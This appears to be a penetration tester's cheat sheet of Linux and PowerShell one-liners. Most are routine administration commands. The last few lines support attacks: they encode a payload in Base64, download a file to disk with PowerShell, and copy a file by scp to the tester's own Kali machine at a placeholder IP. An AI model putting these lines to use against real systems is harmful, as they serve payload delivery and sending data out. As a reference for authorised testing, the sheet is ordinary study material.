Locate file by name:
`locate <filename>`

Find commands:
`man -k <regex search term>`

Find command location:
`which <command>`

Find and replace in file:
`sed -i ‘s/<search term>/<replace term>/g’ <target filename>`

Change Password:
`passwd`

Start SSH:
`sudo systemctl start ssh`
`sudo ss -antlp | grep sshd`

Start HTTP:
`sudo systemctl start apache2`
`sudo ss -antlp | grep apache`
`python3 -m http.server 80`

See All Available Services:
`systemctl list-unit-files`

Install Shit Locally:
`sudo dpkg -i ./<path to .deb file>`

Assign New Environment Variable:
`export NEW-VARIABLE-NAME=VALUE-TO-ASSIGN-IT-TO`

Inspect Existing Environment Variables:
`env`

View Session Command History:
`history`

Rerun Command From History:
`!<line number of command as displayed in history>`
OR
`!!` to execute the last command run

Monitor CPU Usage:
`watch -n 1 ps aux --sort=%cpu | head -n 10`

Get PID:
`ps | grep <thing you want to find>`
eg. `ps | grep firefox`

Powershell or CMD:
`(dir 2>&1 *`|echo CMD);&<# rem #>echo Powershell`

Powershell Convert to Base64:
`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<insert payload here>'))`

Powershell Convert from Base64:
`[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('<insert payload here>'))`

Powershell Download From URL:
`(New-Object System.Net.WebClient).DownloadFile("<URL>","C:\path\to\destination")`

Powershell SCP:
`scp filename.txt kali@<our IP>:/home/kali`